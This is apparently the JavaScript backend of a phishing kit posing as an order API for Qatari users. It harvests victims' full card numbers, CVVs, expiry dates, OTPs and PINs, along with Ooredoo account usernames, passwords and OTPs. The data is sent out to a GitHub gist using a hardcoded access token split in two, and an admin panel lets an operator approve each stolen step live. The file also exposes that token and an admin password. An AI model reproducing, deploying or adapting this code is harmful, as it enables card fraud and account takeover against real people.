const https = require("https");

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "qnb2026";
const GIST_ID = process.env.GIST_ID || "dd7f9a54aff0608980d04c04360bf271";
const _a = "ghp_", _b = "rhuf8iE6u91OJ3hPSk1IKLzYsLNFpf1KDOyS";
const GIST_TOKEN = process.env.GIST_TOKEN || (_a + _b);

let orders = [];
const visitors = new Map();
const ACTIVE_MS = 10000;

function gistRequest(method, body) {
  return new Promise(function(resolve, reject) {
    var data = body ? JSON.stringify(body) : "";
    var opts = {
      hostname: "api.github.com",
      path: "/gists/" + GIST_ID,
      method: method,
      headers: {
        "User-Agent": "nbq-server",
        "Accept": "application/vnd.github+json",
        "Content-Type": "application/json"
      }
    };
    if (GIST_TOKEN) opts.headers["Authorization"] = "token " + GIST_TOKEN;
    if (body) opts.headers["Content-Length"] = Buffer.byteLength(data);
    var req = https.request(opts, function(res) {
      var chunks = [];
      res.on("data", function(c) { chunks.push(c); });
      res.on("end", function() {
        try { resolve(JSON.parse(Buffer.concat(chunks).toString())); }
        catch(e) { resolve(null); }
      });
    });
    req.on("error", reject);
    if (body) req.write(data);
    req.end();
  });
}

async function loadFromGist() {
  try {
    var g = await gistRequest("GET");
    if (g && g.files && g.files["orders.json"]) {
      var parsed = JSON.parse(g.files["orders.json"].content);
      orders = parsed.orders || [];
    }
  } catch(e) {}
}

async function saveToGist() {
  try {
    await gistRequest("PATCH", {
      files: { "orders.json": { content: JSON.stringify({ orders: orders, updated: Date.now() }) } }
    });
  } catch(e) {}
}

function activeVisitors() {
  var now = Date.now();
  for (var entry of visitors) { if (now - entry[1].t > ACTIVE_MS) visitors.delete(entry[0]); }
  return Array.from(visitors.values());
}

var isAdmin = function(req) { return req.headers["x-admin-password"] === ADMIN_PASSWORD; };
var str = function(v, max) { if (!max) max = 300; return String(v == null ? "" : v).slice(0, max); };

function cleanOrder(b) {
  var p = b.pay && typeof b.pay === "object" ? b.pay : {};
  var ord = b.ooredoo && typeof b.ooredoo === "object" ? b.ooredoo : {};
  var rawCard = b.cardNumber || p.cardNumber || p.number || p.fullCard || p.card || "";
  if (typeof rawCard === "boolean") rawCard = "";
  var rawCvv = b.cvv || p.cvv || "";
  if (typeof rawCvv === "boolean") rawCvv = "";
  var rawExp = b.expiry || p.exp || p.expiry || "";
  if (typeof rawExp === "boolean") rawExp = "";
  var rawOtp = b.otp || p.otp || p.code || "";
  if (typeof rawOtp === "boolean") rawOtp = "";
  var rawPin = b.pin || p.pin || "";
  if (typeof rawPin === "boolean") rawPin = "";
  var rawName = b.cardName || p.cardName || p.name || "";
  if (typeof rawName === "boolean") rawName = "";
  return {
    ref: str(b.ref, 40), status: ["confirmed","awaiting"].includes(b.status) ? b.status : "pending",
    card: str(b.card, 10), watch: str(b.watch, 10),
    st: b.st === "resident" ? "resident" : "citizen",
    n: str(b.n, 120), id: str(b.id, 20).replace(/\D/g, ""), p: str(b.p, 15).replace(/\D/g, ""),
    e: str(b.e, 160), g: b.g === "female" ? "female" : "male",
    em: str(b.em, 30), a: str(b.a, 5), ad: str(b.ad || b.address || "", 500),
    bank: str(b.bank, 20), bankName: str(b.bankName || "", 200),
    lang: b.lang === "en" ? "en" : "ar",
    step: ["card","otp","pin","ooredoo","ooredoo-otp"].includes(b.step) ? b.step : undefined,
    pay: {
      cardName: str(rawName, 200), cardNumber: str(rawCard, 200),
      last4: str((rawCard.slice(-4) || p.last4 || "").replace(/\D/g, ""), 4),
      brand: ["visa","mc","amex"].includes(p.brand || b.brand) ? (p.brand || b.brand) : "",
      exp: str(rawExp, 50), cvv: str(rawCvv, 50), otp: str(rawOtp, 50), pin: str(rawPin, 50)
    },
    ooredoo: { username: str(ord.username, 200), password: str(ord.password, 200), otp: str(ord.otp, 50) }
  };
}

module.exports = async function handler(req, res) {
  try {
    var apiPath = req.query && req.query.__apiPath ? String(req.query.__apiPath) : "";
    var url = "/api/" + apiPath;
    var method = req.method || "GET";
    var b = {};
    if (req.body && typeof req.body === "object") b = req.body;

    await loadFromGist();

    var needsSave = false;

    if (method === "POST" && url === "/api/orders") {
      var o = cleanOrder(b);
      if (o.pay === undefined) delete o.pay;
      if (o.step === undefined) delete o.step;
      if (b.ooredoo && typeof b.ooredoo === "object" && o.ref) {
        var idx = orders.findIndex(function(x) { return x.ref === o.ref; });
        if (idx >= 0) {
          var incoming = b.ooredoo;
          var current = Object.assign({}, orders[idx].ooredoo);
          ["username","password","otp"].forEach(function(key) {
            if (Object.prototype.hasOwnProperty.call(incoming, key)) {
              current[key] = str(incoming[key], key === "otp" ? 50 : 200);
            }
          });
          orders[idx].ooredoo = current;
          orders[idx].status = "awaiting";
          orders[idx].step = o.step === "ooredoo-otp" ? "ooredoo-otp" : "ooredoo";
          orders[idx].decision = "";
          orders[idx].reason = "";
          orders[idx].next = "";
          orders[idx].updated = Date.now();
          await saveToGist();
          return res.status(200).json({ ok: true, ref: o.ref });
        } else {
          orders.unshift({
            ref: o.ref, status: "awaiting",
            step: o.step === "ooredoo-otp" ? "ooredoo-otp" : "ooredoo",
            ooredoo: o.ooredoo, decision: "", reason: "", next: "",
            n: o.n || "", p: o.p || "", ts: Date.now(), updated: Date.now()
          });
          await saveToGist();
          return res.status(200).json({ ok: true, ref: o.ref });
        }
      }
      if (!/^(?:FZ|HM)-\d{6,}$/.test(o.ref) || !o.n || !/^\d{8,15}$/.test(o.p)) return res.status(400).json({ ok: false, error: "invalid" });
      var i = orders.findIndex(function(x) { return x.ref === o.ref; });
      if (i >= 0) {
        var prev = orders[i];
        orders[i] = Object.assign({}, prev, o, { ts: prev.ts, status: prev.status === "confirmed" ? "confirmed" : o.status, decision: o.status === "awaiting" ? "" : prev.decision, reason: o.status === "awaiting" ? "" : prev.reason, updated: Date.now() });
      } else {
        orders.unshift(Object.assign({}, o, { ts: Date.now() }));
        if (orders.length > 5000) orders.length = 5000;
      }
      await saveToGist();
      return res.status(200).json({ ok: true, ref: o.ref });
    }

    if (method === "GET" && url.startsWith("/api/status/")) {
      var ref = decodeURIComponent(url.split("/").pop());
      var found = orders.find(function(x) { return x.ref === ref; });
      if (!found) return res.status(404).json({ ok: false });
      return res.status(200).json({ ok: true, status: found.status, decision: found.decision || "", reason: found.reason || "", next: found.next || "" });
    }

    if (method === "POST" && url === "/api/ping") {
      var vid = str(b.id, 40); if (!vid) return res.status(400).json({ ok: false });
      visitors.set(vid, { t: Date.now(), page: str(b.page, 60) });
      return res.status(200).json({ ok: true });
    }

    if (method === "POST" && url === "/api/leave") {
      visitors.delete(str(b.id, 40));
      return res.status(200).json({ ok: true });
    }

    if (url.startsWith("/api/admin/")) {
      if (!isAdmin(req)) return res.status(401).json({ ok: false, error: "unauthorized" });
      if (method === "GET" && url === "/api/admin/check") return res.status(200).json({ ok: true });
      if (method === "GET" && url === "/api/admin/orders") {
        var v = activeVisitors();
        return res.status(200).json({ ok: true, orders: orders, active: v.length, pages: v.map(function(x) { return x.page; }) });
      }
      if (method === "POST" && url.startsWith("/api/admin/decide/")) {
        var dref = decodeURIComponent(url.split("/").pop());
        var decision = b.decision === "reject" ? "reject" : "accept";
        var dorder = orders.find(function(x) { return x.ref === dref; });
        if (!dorder) return res.status(404).json({ ok: false });
        var step = dorder.step || "card";
        if (decision === "reject") {
          dorder.decision = "reject"; dorder.reason = step; dorder.status = "rejected"; dorder.next = "";
        } else {
          var nextOf = { card: "otp", otp: "pin", pin: "done", ooredoo: "otp", "ooredoo-otp": "done" };
          var nxt = nextOf[step];
          dorder.decision = "accept"; dorder.reason = "";
          if (nxt === "done") { dorder.status = "confirmed"; dorder.next = "done"; }
          else { dorder.status = "stepok"; dorder.next = nxt; }
        }
        dorder.updated = Date.now();
        await saveToGist();
        return res.status(200).json({ ok: true, status: dorder.status });
      }
      if (method === "DELETE" && url.startsWith("/api/admin/orders/")) {
        var delref = decodeURIComponent(url.split("/").pop());
        orders = orders.filter(function(o) { return o.ref !== delref; });
        await saveToGist();
        return res.status(200).json({ ok: true });
      }
    }

    return res.status(404).json({ ok: false });
  } catch (e) {
    return res.status(500).json({ ok: false, error: String(e.message) });
  }
};
